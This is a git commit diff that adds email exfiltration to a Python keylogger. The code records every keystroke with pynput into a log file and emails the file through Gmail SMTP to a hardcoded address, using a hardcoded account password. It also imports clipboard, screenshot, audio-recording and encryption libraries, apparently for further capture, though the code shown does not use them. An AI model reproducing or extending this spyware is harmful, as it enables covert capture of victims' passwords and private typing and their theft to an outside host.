54bff7328fb1a4c0d0e27b02da591a8b73f777bc
AnuragTimilsina <anurag.timilsina@gmail.com>
2021-05-16 13:48:56 +0545

    mail functionality added

--- keylogger.py
+++ keylogger.py
@@ -1,30 +1,114 @@
-import pynput
+# reqd. libraries
+
+from email.mime.multipart import MIMEMultipart as MIMEMultipart
+from email.mime.text import MIMEText as MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import smtplib
+
+import socket 
+import platform 
+
+import win32clipboard
+
 from pynput.keyboard import Key, Listener
 
+import time 
+import os 
 
-count = 0
+from scipy.io.wavfile import write
+import sounddevice as sd
+
+from cryptography.fernet import Fernet 
+
+
+import getpass
+from requests import get 
+
+from multiprocessing import Process, freeze_support
+from PIL import ImageGrab
+
+keys_information = "key_log.txt"
+email_address = "evadrop11@gmail.com"
+password = "Evadrop@1729"
+
+toaddr = "evadrop11@gmail.com"
+
+file_path = "C:\\Users\\ASUS\\Documents\\programming\\core_python\\python_keylogger\\eavesdrop"
+extend = "\\"
+
+
+def send_email(filename, attachment, toaddr):
+    fromaddr = email_address
+
+    msg = MIMEMultipart()
+
+    msg['From'] = fromaddr
+
+    msg['To'] = toaddr
+
+    msg['Subject'] = "Log File"
+
+    body = "Body_of_the_mail"
+
+    msg.attach(MIMEText(body, 'plain'))
+
+    filename = filename
+    attachment = open(attachment, 'r')
+
+    p = MIMEBase('application', 'octet-stream')
+
+    p.set_payload((attachment).read())
+
+    encoders.encode_base64(p)
+
+    p.add_header('Content_Disposition', "attachment; filename= %s" % filename)
+
+    msg.attach(p)
+
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+
+    s.starttls()
+
+    s.login(fromaddr, password)
+
+    text = msg.as_string()
+
+    s.sendmail(fromaddr, toaddr, text)
+
+    s.quit()
+
+
+send_email(keys_information, file_path + extend + keys_information, toaddr)
+
+
+count = 0 
 keys = []
 
 
 def on_press(key):
     global keys, count
+
+    print(key)
     keys.append(key)
     count += 1
-    #print("{key} pressed")
 
-    if count >= 50:
+    if count >= 1:
         count = 0
         write_file(keys)
         keys = []
 
+
 def write_file(keys):
-    with open("log.txt", "a") as f:
+    with open(file_path + extend + keys_information, "a") as f:
         for key in keys:
             k = str(key).replace("'", "")
             if k.find("space") > 0:
                 f.write('\n')
+                f.close()
             elif k.find("Key") == -1:
                 f.write(k)
+                f.close()
 
 
 def on_release(key):
@@ -32,5 +116,5 @@ def on_release(key):
         return False
 
 
-with Listener(on_press=on_press, on_release=on_release) as Listener:
-    Listener.join()
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
